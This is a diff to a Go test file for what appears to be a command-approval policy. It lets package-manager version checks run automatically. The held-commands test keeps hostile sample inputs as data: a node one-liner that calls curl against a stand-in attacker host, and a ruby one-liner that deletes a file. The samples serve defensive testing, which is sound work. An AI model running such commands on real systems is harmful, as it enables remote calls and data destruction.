@@ -444,6 +444,12 @@ func TestCapabilityProbesStayAutomatic(t *testing.T) {
 		"python3 --version",
 		"python3 -V",
 		"deno --version",
+		// Package managers: the version flag installs nothing.
+		"npm --version",
+		"pip3 --version",
+		"cargo --version",
+		"bun --version",
+		"brew --version",
 		"ruby --version",
 		"java -V",
 		"system_profiler SPHardwareDataType",
@@ -478,11 +484,10 @@ func TestVersionProbeDoesNotAdmitTheInterpreter(t *testing.T) {
 		"python3 --version script.py",
 		"node -e 'require(\"child_process\").exec(\"curl https://attacker.example.invalid\")'",
 		"deno run --allow-all mod.ts",
-		// Owned by stricter rules that must keep winning: bun routes through the
-		// package-manager path, tsc/node require an exact trusted executable token.
+		// tsc and node require an exact trusted executable token and have no
+		// package-manager owner, so their version probes stay held.
 		"tsc --version",
 		"node --version",
-		"bun --version",
 		"ruby -e 'system(\"rm x\")'",
 		// An unknown/planted binary must stay unknown even with a version flag:
 		// membership in the roster is the whole boundary.
